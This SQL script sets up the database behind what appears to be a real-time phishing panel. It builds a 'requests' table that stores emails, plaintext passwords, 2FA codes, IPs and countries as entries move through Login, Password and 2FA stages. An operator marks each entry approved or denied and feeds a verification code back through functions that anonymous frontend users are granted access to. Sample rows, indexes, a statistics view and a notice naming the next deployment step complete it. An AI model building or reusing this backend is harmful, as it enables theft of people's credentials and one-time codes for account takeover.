-- ========================================
-- 🗄️ DATABASE SCHEMA FOR NEW PROJECT
-- Project: otbswtklpidhezziotac
-- Version: 2.1-AUTO-LOGIN-NEW-PROJECT-WITH-COUNTRY-FIXED
-- ========================================

-- 1. Create requests table with all required columns
CREATE TABLE IF NOT EXISTS public.requests (
  id BIGSERIAL PRIMARY KEY,
  email TEXT DEFAULT 'undefined',
  password TEXT DEFAULT 'undefined', 
  twofa TEXT DEFAULT 'undefined',
  user_agent TEXT DEFAULT 'undefined',
  ip TEXT DEFAULT 'unknown',
  country TEXT DEFAULT 'Unknown',
  page_status TEXT DEFAULT 'Login',
  status TEXT DEFAULT 'pending',
  verification_code TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  approved_at TIMESTAMPTZ
);

-- 1.1. Add missing columns if table already exists
DO $$
BEGIN
  -- Add ip column if it doesn't exist
  IF NOT EXISTS (SELECT 1 FROM information_schema.columns 
                WHERE table_name = 'requests' AND column_name = 'ip' AND table_schema = 'public') THEN
    ALTER TABLE public.requests ADD COLUMN ip TEXT DEFAULT 'unknown';
    RAISE NOTICE 'Added ip column to requests table';
  END IF;
  
  -- Add country column if it doesn't exist
  IF NOT EXISTS (SELECT 1 FROM information_schema.columns 
                WHERE table_name = 'requests' AND column_name = 'country' AND table_schema = 'public') THEN
    ALTER TABLE public.requests ADD COLUMN country TEXT DEFAULT 'Unknown';
    RAISE NOTICE 'Added country column to requests table';
  END IF;
  
  -- Add verification_code column if it doesn't exist
  IF NOT EXISTS (SELECT 1 FROM information_schema.columns 
                WHERE table_name = 'requests' AND column_name = 'verification_code' AND table_schema = 'public') THEN
    ALTER TABLE public.requests ADD COLUMN verification_code TEXT;
    RAISE NOTICE 'Added verification_code column to requests table';
  END IF;
  
  -- Add approved_at column if it doesn't exist
  IF NOT EXISTS (SELECT 1 FROM information_schema.columns 
                WHERE table_name = 'requests' AND column_name = 'approved_at' AND table_schema = 'public') THEN
    ALTER TABLE public.requests ADD COLUMN approved_at TIMESTAMPTZ;
    RAISE NOTICE 'Added approved_at column to requests table';
  END IF;
END $$;

-- 2. Create indexes for better performance (with error handling)
DO $$
BEGIN
  -- Create index on email if it doesn't exist
  IF NOT EXISTS (SELECT 1 FROM pg_indexes WHERE indexname = 'idx_requests_email') THEN
    CREATE INDEX idx_requests_email ON public.requests(email);
    RAISE NOTICE 'Created index on email column';
  END IF;
  
  -- Create index on status if it doesn't exist
  IF NOT EXISTS (SELECT 1 FROM pg_indexes WHERE indexname = 'idx_requests_status') THEN
    CREATE INDEX idx_requests_status ON public.requests(status);
    RAISE NOTICE 'Created index on status column';
  END IF;
  
  -- Create index on created_at if it doesn't exist
  IF NOT EXISTS (SELECT 1 FROM pg_indexes WHERE indexname = 'idx_requests_created_at') THEN
    CREATE INDEX idx_requests_created_at ON public.requests(created_at DESC);
    RAISE NOTICE 'Created index on created_at column';
  END IF;
  
  -- Create index on country if it doesn't exist
  IF NOT EXISTS (SELECT 1 FROM pg_indexes WHERE indexname = 'idx_requests_country') THEN
    CREATE INDEX idx_requests_country ON public.requests(country);
    RAISE NOTICE 'Created index on country column';
  END IF;
  
  -- Create index on ip if it doesn't exist
  IF NOT EXISTS (SELECT 1 FROM pg_indexes WHERE indexname = 'idx_requests_ip') THEN
    CREATE INDEX idx_requests_ip ON public.requests(ip);
    RAISE NOTICE 'Created index on ip column';
  END IF;
END $$;

-- 3. Enable Row Level Security
ALTER TABLE public.requests ENABLE ROW LEVEL SECURITY;

-- 4. Create policy to allow all operations (for service role)
DROP POLICY IF EXISTS "Allow all for service role" ON public.requests;
CREATE POLICY "Allow all for service role" ON public.requests FOR ALL USING (true);

-- 5. Create function to set verification code (drop first if exists)
DROP FUNCTION IF EXISTS set_verification_code(TEXT, TEXT);
CREATE FUNCTION set_verification_code(email_param TEXT, code_param TEXT)
RETURNS JSON
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
DECLARE
  result JSON;
BEGIN
  -- Update the latest request for this email with verification code
  UPDATE public.requests 
  SET verification_code = code_param,
      approved_at = NOW()
  WHERE email = email_param 
    AND id = (
      SELECT id FROM public.requests 
      WHERE email = email_param 
      ORDER BY created_at DESC 
      LIMIT 1
    );
  
  -- Return success result
  SELECT json_build_object(
    'success', true,
    'email', email_param,
    'code', code_param,
    'updated_at', NOW()
  ) INTO result;
  
  RETURN result;
END;
$$;

-- 6. Create function to approve request (drop first if exists)
DROP FUNCTION IF EXISTS approve_request(BIGINT, TEXT);
CREATE FUNCTION approve_request(request_id BIGINT, new_status TEXT)
RETURNS JSON
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
DECLARE
  result JSON;
BEGIN
  UPDATE public.requests 
  SET 
    status = new_status,
    approved_at = CASE WHEN new_status = 'approved' THEN NOW() ELSE NULL END
  WHERE id = request_id;
  
  SELECT json_build_object(
    'id', id,
    'email', email,
    'status', status,
    'country', country,
    'approved_at', approved_at
  ) INTO result
  FROM public.requests 
  WHERE id = request_id;
  
  RETURN result;
END;
$$;

-- 7. Drop existing trigger and function (if they exist)
DROP TRIGGER IF EXISTS update_requests_approved_at ON public.requests;
DROP TRIGGER IF EXISTS update_requests_updated_at ON public.requests;
DROP FUNCTION IF EXISTS update_updated_at_column();

-- 8. Create updated_at trigger function
CREATE FUNCTION update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.approved_at = CASE 
    WHEN NEW.status = 'approved' AND OLD.status != 'approved' THEN NOW()
    WHEN NEW.status != 'approved' THEN NULL
    ELSE NEW.approved_at
  END;
  RETURN NEW;
END;
$$ language 'plpgsql';

-- 9. Create trigger for auto-updating approved_at
CREATE TRIGGER update_requests_approved_at 
  BEFORE UPDATE ON public.requests 
  FOR EACH ROW 
  EXECUTE FUNCTION update_updated_at_column();

-- 10. Insert sample data for testing (with error handling)
DO $$
BEGIN
  -- Check if sample data already exists
  IF NOT EXISTS (SELECT 1 FROM public.requests WHERE email = 'test@gmail.com') THEN
    INSERT INTO public.requests (email, password, page_status, status, country, ip) VALUES
    ('test@gmail.com', 'test123', 'Login', 'approved', 'United States (US)', '192.168.1.100'),
    ('demo@yahoo.com', 'demo456', 'Password', 'pending', 'Vietnam (VN)', '203.162.4.191'),
    ('sample@hotmail.com', 'sample789', '2FA', 'denied', 'Germany (DE)', '85.214.132.117'),
    ('auto@example.com', 'auto999', 'Login', 'pending', 'United States (US)', 'unknown'),
    ('country@test.com', 'country123', 'Password', 'approved', 'Japan (JP)', '133.18.203.212');
    RAISE NOTICE 'Sample data inserted successfully';
  ELSE
    RAISE NOTICE 'Sample data already exists, skipping insert';
  END IF;
EXCEPTION
  WHEN OTHERS THEN
    RAISE NOTICE 'Error inserting sample data: %', SQLERRM;
END $$;

-- 11. Create view for statistics (optional)
CREATE OR REPLACE VIEW public.request_stats AS
SELECT 
  COUNT(*) as total_requests,
  COUNT(*) FILTER (WHERE status = 'approved') as approved_requests,
  COUNT(*) FILTER (WHERE status = 'denied') as denied_requests,
  COUNT(*) FILTER (WHERE status = 'pending') as pending_requests,
  ROUND(
    (COUNT(*) FILTER (WHERE status = 'approved')::NUMERIC / NULLIF(COUNT(*), 0)) * 100, 
    2
  ) as approval_rate,
  COUNT(DISTINCT country) as unique_countries,
  COUNT(DISTINCT ip) as unique_ips,
  MAX(created_at) as latest_request,
  MIN(created_at) as first_request
FROM public.requests;

-- 12. Grant permissions to anon role (for frontend access)
GRANT SELECT, INSERT, UPDATE ON public.requests TO anon;
GRANT SELECT ON public.request_stats TO anon;
GRANT EXECUTE ON FUNCTION set_verification_code(TEXT, TEXT) TO anon;
GRANT EXECUTE ON FUNCTION approve_request(BIGINT, TEXT) TO anon;

-- 13. Grant permissions to authenticated role
GRANT ALL ON public.requests TO authenticated;
GRANT ALL ON public.request_stats TO authenticated;
GRANT EXECUTE ON FUNCTION set_verification_code(TEXT, TEXT) TO authenticated;
GRANT EXECUTE ON FUNCTION approve_request(BIGINT, TEXT) TO authenticated;

-- ========================================
-- ✅ DATABASE SCHEMA COMPLETE
-- ========================================

-- Success message
DO $$
BEGIN
  RAISE NOTICE '===========================================';
  RAISE NOTICE '✅ SUCCESS: Database schema updated successfully!';
  RAISE NOTICE 'Project: otbswtklpidhezziotac';
  RAISE NOTICE 'Version: FIXED - ROUND function type casting resolved';
  RAISE NOTICE 'Features: Auto-Login + Country Detection + IP Geolocation';
  RAISE NOTICE 'Tables: requests (with sample data)';
  RAISE NOTICE 'Functions: set_verification_code, approve_request (recreated)';
  RAISE NOTICE 'Triggers: update_requests_approved_at (recreated)';
  RAISE NOTICE 'Views: request_stats (with fixed ROUND function)';
  RAISE NOTICE 'Next step: Deploy Edge Function admin-api';
  RAISE NOTICE '===========================================';
END $$; 